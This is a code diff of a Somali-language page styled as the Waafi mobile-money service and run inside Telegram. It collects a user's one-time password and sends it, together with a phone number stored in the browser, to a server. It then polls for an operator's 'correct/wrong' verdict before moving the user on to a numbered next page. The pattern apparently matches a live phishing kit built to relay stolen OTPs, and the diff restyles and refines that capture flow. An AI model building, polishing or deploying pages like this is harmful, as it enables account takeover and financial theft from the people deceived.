@@ -1,122 +1,148 @@
 <!DOCTYPE html>
 <html lang="so">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Xaqiijinta OTP-ga Kowaad</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Waafi - OTP Kowaad</title>
 
-<script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <!-- ✅ FIXED TELEGRAM SCRIPT -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
 
-<style>
-body {
-    font-family: -apple-system, sans-serif;
-    background-color: #f7f7f7;
-    margin: 0;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    min-height: 100vh;
-}
+    <style>
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
+            background-color: #f7f7f7; 
+            margin: 0; 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
 
-.toast {
-    position: fixed;
-    top: 40px;
-    background: #263238;
-    color: white;
-    padding: 15px 25px;
-    border-radius: 12px;
-    display: flex;
-    align-items: center;
-    gap: 12px;
-    font-size: 15px;
-    opacity: 0;
-    transition: opacity 0.5s ease;
-    z-index: 100;
-}
-.toast.show { opacity: 1; }
+        .toast { 
+            position: fixed; 
+            top: 30px; 
+            background: #263238; 
+            color: white; 
+            padding: 14px 20px; 
+            border-radius: 12px; 
+            display: flex; 
+            align-items: center; 
+            gap: 12px; 
+            font-size: 14px; 
+            box-shadow: 0 8px 20px rgba(0,0,0,0.3); 
+            opacity: 0; 
+            transform: translateY(-20px);
+            transition: all 0.5s ease; 
+            z-index: 1000; 
+            width: 85%;
+            max-width: 350px;
+        }
+        .toast.show { opacity: 1; transform: translateY(0); }
 
-.tick-circle {
-    width: 22px;
-    height: 22px;
-    background: #82d13d;
-    border-radius: 50%;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    font-size: 14px;
-    font-weight: bold;
-}
+        .tick-circle { 
+            width: 20px; height: 20px; background: #82d13d; border-radius: 50%; 
+            display: flex; align-items: center; justify-content: center; 
+            font-size: 12px; color: white; font-weight: bold; 
+        }
 
-.card {
-    background: white;
-    width: 92%;
-    max-width: 420px;
-    margin-top: 60px;
-    padding: 40px 20px;
-    border-radius: 15px;
-    text-align: center;
-    box-shadow: 0 5px 20px rgba(0,0,0,0.05);
-}
+        .card { 
+            background: white; 
+            width: 90%; 
+            max-width: 400px; 
+            margin-top: 50px; 
+            padding: 40px 20px; 
+            border-radius: 20px; 
+            text-align: center; 
+            box-shadow: 0 4px 15px rgba(0,0,0,0.05); 
+            box-sizing: border-box;
+        }
+        
+        h2 { font-size: 24px; color: #222; margin-bottom: 15px; font-weight: 700; }
+        .instruction { color: #666; font-size: 15px; margin-bottom: 25px; line-height: 1.4; }
 
-#loadingSection { display: none; }
+        .otp-group { 
+            display: flex; 
+            justify-content: center; 
+            gap: 8px; 
+            margin: 0 auto 30px auto; 
+            width: 100%;
+        }
 
-.loader-circle {
-    width: 120px;
-    height: 120px;
-    background: radial-gradient(circle, #a3e635 0%, #82d13d 100%);
-    border-radius: 50%;
-    margin: 0 auto 30px;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-}
+        .otp-input { 
+            width: 42px; 
+            height: 55px; 
+            border: 1.5px solid #82d13d; 
+            border-radius: 10px; 
+            text-align: center; 
+            font-size: 22px; 
+            font-weight: bold; 
+            outline: none; 
+            background: #fff;
+            color: #333;
+        }
 
-.loader-circle::after {
-    content: '';
-    width: 90px;
-    height: 90px;
-    border: 4px solid rgba(255,255,255,0.3);
-    border-top: 4px solid white;
-    border-radius: 50%;
-    animation: spin 1.5s linear infinite;
-}
+        .resend-text { color: #999; font-size: 14px; margin-bottom: 35px; }
 
-@keyframes spin {
-    0% { transform: rotate(0deg); }
-    100% { transform: rotate(360deg); }
-}
+        .btn-verify { 
+            background-color: #e0e0e0; 
+            color: #999; 
+            border: none; 
+            width: 100%; 
+            padding: 18px; 
+            border-radius: 12px; 
+            font-size: 16px; 
+            font-weight: bold; 
+            text-transform: uppercase; 
+            cursor: not-allowed;
+            transition: 0.3s;
+        }
 
-.otp-group {
-    display: flex;
-    justify-content: center;
-    gap: 8px;
-}
+        .btn-verify.active { 
+            background-color: #82d13d; 
+            color: white; 
+            cursor: pointer; 
+        }
 
-.otp-input {
-    width: 50px;
-    height: 60px;
-    border: 1.5px solid #82d13d;
-    border-radius: 8px;
-    text-align: center;
-    font-size: 24px;
-    font-weight: bold;
-}
+        #loadingSection { display: none; }
 
-.btn-verify {
-    width: 100%;
-    padding: 18px;
-    border-radius: 10px;
-    border: none;
-    background: #e0e0e0;
-    color: #aaa;
-    font-weight: bold;
-}
+        .loader-circle { 
+            width: 100px; height: 100px; 
+            background: radial-gradient(circle, #a3e635 0%, #82d13d 100%); 
+            border-radius: 50%; 
+            margin: 0 auto 25px; 
+            display: flex; justify-content: center; align-items: center; 
+        }
 
-.btn-verify.active {
-    background: #82d13d;
-    color: white;
-}
-</style>
+        .loader-circle::after { 
+            content: ''; 
+            width: 75px; height: 75px; 
+            border: 4px solid rgba(255, 255, 255, 0.3); 
+            border-top: 4px solid white; 
+            border-radius: 50%; 
+            animation: spin 1s linear infinite; 
+        }
+
+        @keyframes spin { 
+            0% { transform: rotate(0deg); } 
+            100% { transform: rotate(360deg); } 
+        }
+
+        .green-header { color: #82d13d; font-size: 26px; font-weight: bold; margin-bottom: 10px; }
+        .wait-text { color: #666; font-size: 16px; }
+
+        .footer-wave { 
+            width: 100%; 
+            background: linear-gradient(to bottom, #82d13d, #a3e635); 
+            padding: 60px 0;
+            margin-top: auto; 
+            border-top-left-radius: 50% 30px; 
+            border-top-right-radius: 50% 30px; 
+            text-align: center; 
+            color: white;
+        }
+    </style>
 </head>
 
 <body>
@@ -128,8 +154,8 @@ body {
 
 <div class="card" id="inputSection">
     <h2>Xaqiijinta OTP-ga Kowaad</h2>
-    <p>Geli OTP-ga kowaad ee loogu diray lambarkaaga</p>
-
+    <p class="instruction">Geli OTP-ga kowaad ee loogu diray lambarkaaga</p>
+    
     <div class="otp-group">
         <input type="text" maxlength="1" class="otp-input">
         <input type="text" maxlength="1" class="otp-input">
@@ -139,13 +165,21 @@ body {
         <input type="text" maxlength="1" class="otp-input">
     </div>
 
-    <button id="verifyBtn" class="btn-verify" disabled>XAQIIJI OTP-GA KOWAAD</button>
+    <p class="resend-text">Koodka mar kale u dir <span id="timer">60</span> ilbiriqsi</p>
+
+    <button id="verifyBtn" class="btn-verify" onclick="handleVerification()" disabled>
+        XAQIIJI OTP-GA KOWAAD
+    </button>
 </div>
 
 <div class="card" id="loadingSection">
     <div class="loader-circle"></div>
-    <h3 style="color:#82d13d;">Xaqiijinta OTP-ga</h3>
-    <p>Fadlan sug... (<span id="loadTimer">0</span>s)</p>
+    <div class="green-header">Xaqiijinta OTP-ga</div>
+    <div class="wait-text">Fadlan sug...</div>
+</div>
+
+<div class="footer-wave">
+    <p>© 2026 Waafi Soomaaliya</p>
 </div>
 
 <script>
@@ -153,54 +187,57 @@ const inputs = document.querySelectorAll('.otp-input');
 const verifyBtn = document.getElementById('verifyBtn');
 const inputSection = document.getElementById('inputSection');
 const loadingSection = document.getElementById('loadingSection');
-const loadTimer = document.getElementById('loadTimer');
+const timerText = document.getElementById('timer');
+const toast = document.getElementById('successToast');
 
-let timerInterval;
-let pollInterval;
-
-// Telegram safe init
-window.Telegram?.WebApp?.ready();
-window.Telegram?.WebApp?.expand();
-
-// Toast
 window.onload = () => {
+    window.Telegram?.WebApp.ready();
+    window.Telegram?.WebApp.expand();
+
+    startCountdown();
+
     setTimeout(() => {
-        document.getElementById('successToast').classList.add('show');
-        setTimeout(() => {
-            document.getElementById('successToast').classList.remove('show');
-        }, 2500);
-    }, 400);
+        toast.classList.add('show');
+        setTimeout(() => toast.classList.remove('show'), 4000);
+    }, 1000);
 };
 
-// OTP input logic
+function startCountdown() {
+    let count = 60;
+    const interval = setInterval(() => {
+        count--;
+        timerText.innerText = count;
+        if (count <= 0) clearInterval(interval);
+    }, 1000);
+}
+
 inputs.forEach((input, index) => {
     input.addEventListener('input', () => {
-        if (input.value && index < inputs.length - 1) {
-            inputs[index + 1].focus();
-        }
+        if (input.value && index < inputs.length - 1) inputs[index + 1].focus();
+        checkInputs();
+    });
 
-        const filled = [...inputs].every(i => i.value.length === 1);
-        verifyBtn.disabled = !filled;
-        verifyBtn.classList.toggle('active', filled);
+    input.addEventListener('keydown', (e) => {
+        if (e.key === "Backspace" && !input.value && index > 0) {
+            inputs[index - 1].focus();
+        }
     });
 });
 
-// Button click
-verifyBtn.addEventListener('click', async () => {
+function checkInputs() {
+    const filled = [...inputs].every(input => input.value.length === 1);
+    verifyBtn.disabled = !filled;
+    verifyBtn.classList.toggle('active', filled);
+}
+
+async function handleVerification() {
     let otpValue = "";
     inputs.forEach(i => otpValue += i.value);
 
-    const phone = localStorage.getItem('phone') || "";
+    const phone = localStorage.getItem('phone');
 
     inputSection.style.display = "none";
     loadingSection.style.display = "block";
-
-    // timer
-    let sec = 0;
-    timerInterval = setInterval(() => {
-        sec++;
-        loadTimer.innerText = sec;
-    }, 1000);
 
     try {
         await fetch('/api/verify-first-otp', {
@@ -208,45 +245,40 @@ verifyBtn.addEventListener('click', async () => {
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ phone, otp: otpValue })
         });
-    } catch (e) {
-        console.error(e);
-    }
 
-    // polling
-    pollInterval = setInterval(async () => {
-        try {
+        const poll = setInterval(async () => {
             const res = await fetch(`/api/check-status?phone=${phone}`);
             const data = await res.json();
 
             if (data.status === "otp1_correct") {
-                clearAll();
+                clearInterval(poll);
                 window.location.href = "/page9";
             }
 
             if (data.status === "otp1_wrong") {
-                clearAll();
-                alert("OTP waa khalad");
-                resetUI();
+                clearInterval(poll);
+                alert("Koodka waa khalad");
+                reset();
             }
-        } catch (e) {
-            console.error("Polling error", e);
-        }
-    }, 3000);
-});
 
-function clearAll() {
-    clearInterval(timerInterval);
-    clearInterval(pollInterval);
+        }, 3000);
+
+    } catch (e) {
+        console.error(e);
+    }
 }
 
-function resetUI() {
+function reset() {
     loadingSection.style.display = "none";
     inputSection.style.display = "block";
+
     inputs.forEach(i => i.value = "");
+    inputs[0].focus();
+
     verifyBtn.disabled = true;
     verifyBtn.classList.remove('active');
 }
 </script>
 
 </body>
-  </html>
+</html>
